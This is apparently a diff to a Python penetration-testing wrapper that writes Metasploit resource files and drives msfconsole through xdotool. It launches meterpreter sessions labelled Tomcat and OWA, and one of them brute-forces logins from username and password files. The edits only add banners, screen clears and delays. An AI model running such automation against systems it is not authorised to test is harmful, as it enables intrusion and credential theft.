@@ -3468,11 +3468,15 @@ while True:
             one, two, three, four = target.split(" ")
             target = two.rstrip(" ")
             write.write("set lhost " + target + "\n")
+            write.write("clear\n")
+            write.write("cat banner.tmp\n")
             write.write("run\n")
    
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
+         banner("BANNER4")
+         time.sleep(10)
          command("xdotool key Ctrl+Tab")
       
 # ------------------------------------------------------------------------------------- 
@@ -3494,16 +3498,16 @@ while True:
             write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
             write.write("set USER_FILE " + dataDir + "/usernames.txt\n")
             write.write("set PASS_FILE " + dataDir + "/passwords.txt\n")
-            command("hostname -I >> temp.tmp")
-            target = linecache.getline("temp.tmp",1)
-            one, two, three, four = target.split(" ")
-            target = two.rstrip(" ")
-            write.write("set lhost " + target + "\n")
+            write.write("set lhost " + localIP + "\n")
+            write.write("clear\n")
+            write.write("cat banner.tmp\n")
             write.write("run\n")
    
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
+         banner("BANNER4")
+         time.sleep(10)
          command("xdotool key Ctrl+Tab")
 
 # ------------------------------------------------------------------------------------- 
